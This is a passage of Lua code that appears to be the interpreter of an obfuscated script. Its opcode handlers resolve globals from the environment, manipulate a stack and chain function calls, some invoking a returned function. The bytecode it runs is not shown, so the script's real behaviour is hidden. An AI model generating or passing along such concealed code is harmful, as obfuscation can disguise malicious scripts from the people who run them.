                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 159) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 160) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 167) then
              if (Enum <= 164) then
                if (Enum <= 162) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 163) then
                  VIP = Inst[3];
                else
                  Stk[Inst[2]] = {};
                end
              elseif (Enum <= 165) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum == 166) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 170) then
              if (Enum <= 168) then
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum > 169) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 172) then
              if (Enum > 171) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum == 173) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = {};
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum <= 186) then
            if (Enum <= 180) then
              if (Enum <= 177) then
                if (Enum <= 175) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
